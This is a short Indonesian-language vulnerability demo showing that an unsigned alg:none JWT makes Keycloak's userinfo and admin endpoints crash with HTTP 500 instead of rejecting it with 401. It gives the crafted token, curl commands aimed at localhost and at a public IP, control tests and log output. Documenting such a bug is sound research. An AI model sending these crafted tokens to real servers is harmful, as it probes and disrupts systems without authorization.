# Tutorial: Finding #2 — alg:none JWT → HTTP 500 (NullPointerException)

**Severity:** MEDIUM (CVSS 5.3)
**Waktu demo:** ~3 menit
**Kebutuhan:** Terminal saja (tidak perlu login)

---

## Langkah 0: Pastikan Keycloak Berjalan

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

---

## Langkah 1: Buat JWT dengan alg:none

Token ini dibuat tanpa perlu kredensial apapun — ini serangan unauthenticated.

```bash
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"attacker","exp":9999999999}
# Signature: (kosong)
ALG_NONE="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0."
```

Verifikasi isi JWT:
```bash
echo "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0" | base64 -d 2>/dev/null
```
Output: `{"alg":"none","typ":"JWT"}`

```bash
echo "eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0=" | base64 -d 2>/dev/null
```
Output: `{"sub":"attacker","exp":9999999999}`

> **Poin:** Token ini punya `alg: none` — artinya tidak ada signature. Server seharusnya langsung tolak dengan 401.

---

## Langkah 2: Kirim ke /userinfo Endpoint

```bash
ALG_NONE="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0."

curl -si http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $ALG_NONE"
```

**Yang diharapkan (aman):**
```
HTTP/1.1 401 Unauthorized
{"error":"invalid_token"}
```

**Yang terjadi (VULNERABLE):**
```
HTTP/1.1 500 Internal Server Error
{"error":"unknown_error","error_description":"For more on this error consult the server log."}
```

> **HTTP 500 bukan 401!** Server crash dengan NullPointerException.

---

## Langkah 3: Kirim ke Admin API /users

```bash
curl -si http://46.101.162.187:8080/admin/realms/test/users \
  -H "Authorization: Bearer $ALG_NONE"
```

**Output (VULNERABLE):**
```
HTTP/1.1 500 Internal Server Error
{"error":"unknown_error"}
```

---

## Langkah 4: Kirim ke Admin API /clients

```bash
curl -si http://46.101.162.187:8080/admin/realms/test/clients \
  -H "Authorization: Bearer $ALG_NONE"
```

**Output (VULNERABLE):**
```
HTTP/1.1 500 Internal Server Error
```

---

## Langkah 5: Control Test — Random String (Harus 401)

Untuk membuktikan bahwa 500 itu spesifik pada `alg:none`, bukan error umum:

```bash
curl -si http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer ini-bukan-jwt-yang-valid"
```

**Output (Benar):**
```
HTTP/1.1 401 Unauthorized
```

> Random string → 401 (benar). Tapi alg:none → 500 (bug).

---

## Langkah 6: Control Test — JWT dengan Signature Salah (Harus 401)

```bash
curl -si http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.signature-salah"
```

**Output (Benar):**
```
HTTP/1.1 401 Unauthorized
```

> JWT dengan alg:RS256 tapi signature salah → 401 (benar). Hanya alg:none yang menyebabkan 500.

---

## Langkah 7: Cek Server Log (Opsional)

```bash
tail -20 /home/anggi/keycloak-research/keycloak.log | grep -A5 "NullPointerException"
```

**Output yang diharapkan:**
```
ERROR [org.keycloak.services.error.KeycloakErrorHandler]
Uncaught server error: java.lang.NullPointerException:
Cannot invoke "org.keycloak.crypto.SignatureProvider.verifier(String)"
because the return value of
"org.keycloak.models.KeycloakSession.getProvider(java.lang.Class, String)" is null
```

---

## Langkah 8: Jalankan Python PoC (Otomatis Semua)

```bash
python3 pocs/poc_f2_alg_none_npe.py --host http://localhost:8080
```

---

## Ringkasan

| Endpoint | Token | Expected | Actual | Status |
|---|---|---|---|---|
| /userinfo | alg:none | 401 | **500** | VULNERABLE |
| /admin/users | alg:none | 401 | **500** | VULNERABLE |
| /admin/clients | alg:none | 401 | **500** | VULNERABLE |
| /userinfo | random string | 401 | 401 | Correct |
| /userinfo | wrong signature | 401 | 401 | Correct |

**Kesimpulan:** Semua Bearer-authenticated endpoint crash dengan NullPointerException ketika menerima JWT dengan `alg:none`. Tidak perlu kredensial apapun untuk trigger.
